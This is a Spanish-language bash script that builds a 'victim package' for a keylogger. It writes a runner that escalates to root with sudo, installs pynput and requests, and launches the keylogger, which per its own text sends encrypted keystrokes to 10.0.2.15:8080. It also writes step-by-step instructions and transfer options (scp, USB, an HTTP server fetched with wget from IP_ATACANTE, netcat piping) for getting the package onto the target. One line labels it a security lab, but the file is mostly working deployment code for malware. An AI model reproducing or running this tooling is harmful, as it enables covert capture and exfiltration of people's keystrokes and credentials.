#!/bin/bash
# deploy_victim.sh - solucion garantizada para despliegue

echo "preparacion de archivos para victima"
echo "===================================="

# verificar archivos necesarios
if [ ! -f "unified_keylogger.py" ] || [ ! -f "reconstructor.py" ]; then
    echo "error: archivos fuente no encontrados"
    exit 1
fi

# crear directorio de despliegue
echo "creando paquete de despliegue..."
rm -rf victim_package
mkdir -p victim_package

# copiar archivos esenciales
cp unified_keylogger.py victim_package/
cp reconstructor.py victim_package/

# crear script de ejecucion autocontenido
cat > victim_package/run_keylogger.sh << 'EOF'
#!/bin/bash
# keylogger autocontenido para victima

echo "keylogger para laboratorio de seguridad"
echo "======================================="

# verificar permisos de root
if [ "$EUID" -ne 0 ]; then
    echo "necesitas permisos de administrador"
    echo "relanzando con sudo..."
    exec sudo "$0" "$@"
fi

# instalar dependencias automaticamente
echo "verificando dependencias..."

# verificar python3
if ! command -v python3 &> /dev/null; then
    echo "instalando python3..."
    apt update && apt install -y python3 python3-pip
fi

# instalar pynput
if ! python3 -c "import pynput" 2>/dev/null; then
    echo "instalando pynput..."
    apt install -y python3-pynput || pip3 install pynput --break-system-packages
fi

# instalar requests
if ! python3 -c "import requests" 2>/dev/null; then
    echo "instalando requests..."
    apt install -y python3-requests || pip3 install requests --break-system-packages
fi

echo "dependencias verificadas"
echo "iniciando keylogger..."
echo "configurado para enviar a: 10.0.2.15:8080"
echo "presiona ctrl+c para detener"
echo ""

# ejecutar keylogger
python3 unified_keylogger.py

echo ""
echo "keylogger detenido"
EOF

# hacer ejecutable
chmod +x victim_package/run_keylogger.sh

# crear instrucciones
cat > victim_package/INSTRUCCIONES.md << 'EOF'
# INSTRUCCIONES PARA MAQUINA VICTIMA

## Transferencia de archivos
```bash
# desde maquina atacante:
scp -r victim_package/ usuario@victima:/tmp/

# o usar usb, red compartida, etc.
```

## Ejecucion en victima
```bash
# en la maquina victima:
cd /tmp/victim_package/
sudo ./run_keylogger.sh
```

## Que hace automaticamente:
- Verifica e instala dependencias de python
- Instala pynput y requests si no existen
- Ejecuta el keylogger
- Envia datos cifrados a 10.0.2.15:8080

## Para detener:
- Presiona Ctrl+C

## Archivos incluidos:
- unified_keylogger.py (keylogger principal)
- reconstructor.py (funciones de cifrado)
- run_keylogger.sh (instalador y ejecutor)
- INSTRUCCIONES.md (este archivo)
EOF

# crear script de transferencia
cat > transfer_package.sh << 'EOF'
#!/bin/bash
# transfer_package.sh - transferir paquete a victima

echo "opciones de transferencia:"
echo "========================="
echo ""
echo "1. SCP (red):"
echo "   scp -r victim_package/ usuario@IP_VICTIMA:/tmp/"
echo ""
echo "2. USB/almacenamiento:"
echo "   cp -r victim_package/ /media/usb/"
echo ""
echo "3. servidor web temporal:"
echo "   cd victim_package && python3 -m http.server 8000"
echo "   # en victima: wget -r http://IP_ATACANTE:8000/"
echo ""
echo "4. netcat:"
echo "   tar -czf - victim_package/ | nc -l -p 9999"
echo "   # en victima: nc IP_ATACANTE 9999 | tar -xzf -"
echo ""
echo "ejecucion en victima:"
echo "===================="
echo "cd victim_package/"
echo "sudo ./run_keylogger.sh"
EOF

chmod +x transfer_package.sh

# mostrar resultado
echo ""
echo "✅ paquete de despliegue creado exitosamente"
echo "============================================"
echo "📁 contenido del paquete:"
ls -la victim_package/
echo ""
echo "📋 archivos totales: $(find victim_package/ -type f | wc -l)"
echo "💾 tamaño total: $(du -sh victim_package/ | cut -f1)"
echo ""
echo "🚀 para transferir y ejecutar:"
echo "   ./transfer_package.sh"
echo ""
echo "🎯 o directamente:"
echo "   scp -r victim_package/ usuario@victima:/tmp/"
echo "   ssh usuario@victima 'cd /tmp/victim_package && sudo ./run_keylogger.sh'"
